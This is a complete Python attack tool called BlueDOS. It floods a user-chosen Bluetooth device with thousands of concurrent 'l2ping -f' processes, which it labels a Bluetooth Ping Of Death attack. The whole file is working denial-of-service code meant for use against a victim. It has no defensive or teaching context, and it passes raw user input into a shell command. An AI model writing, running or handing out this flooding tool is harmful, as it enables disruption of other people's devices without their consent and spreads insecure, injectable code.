#!/usr/bin/env python3

import os
import subprocess
from time import sleep as ts

R = "\033[91m" 
B = "\033[94m" 
G = "\033[92m" 
W = "\033[0m"
BOLD = "\033[1m"
POD = "\033[4m"

banner = R+BOLD+r"""
██████╗ ██╗     ██╗   ██╗███████╗██████╗  ██████╗ ███████╗
██╔══██╗██║     ██║   ██║██╔════╝██╔══██╗██╔═══██╗██╔════╝
██████╔╝██║     ██║   ██║█████╗  ██║  ██║██║   ██║███████╗
██╔══██╗██║     ██║   ██║██╔══╝  ██║  ██║██║   ██║╚════██║
██████╔╝███████╗╚██████╔╝███████╗██████╔╝╚██████╔╝███████║
╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═════╝  ╚═════╝ ╚══════╝
                                                          

"""+W

if os.geteuid() != 0:
    print(R+BOLD+"[!]"+W+" Please run the BlueDOS as root!")
    exit()

hop = ["hci0", "", "600"]

def main():
    try:
        print(banner)
        hop[0] = input(B+POD+"INTERFACE"+W+" (default: hci0) > ") or "hci0"
        hop[1] = input(B+POD+"TARGET"+W+" > ")
        hop[2] = int(input(B+POD+"SIZE"+W+" (default: 600) > ") or 600)
        print(G+"-"*30+W)
        start = input("Do you want to start: (Y/n) ")
        if start == 'y' or start == 'Y':
            print(G+"\n[+]"+W+" Bluetooth Ping Of Death Attack Started ...")
            ts(1)
            print(G+"[+]"+W+" Sending packets to the victim. Be patient!")
            try:
                for i in range(1, 10000):
                    xterm_1 = "l2ping -i %s -s %s -f %s &" % (hop[0], hop[2], hop[1])
                    subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    ts(2)
            except(KeyboardInterrupt, OSError):
                print(R+"[-]"+W+" Try again!")
                ts(2)
                main()
        elif start == 'n' or start == 'N':
            print(B+"\n[*]"+W+" Exiting...")
            ts(1)
        else:
            print("Check your command!")
            main()
    except(KeyboardInterrupt):
        print(B+"\n[*]"+W+" Exiting...")

if __name__ == '__main__':
    main()
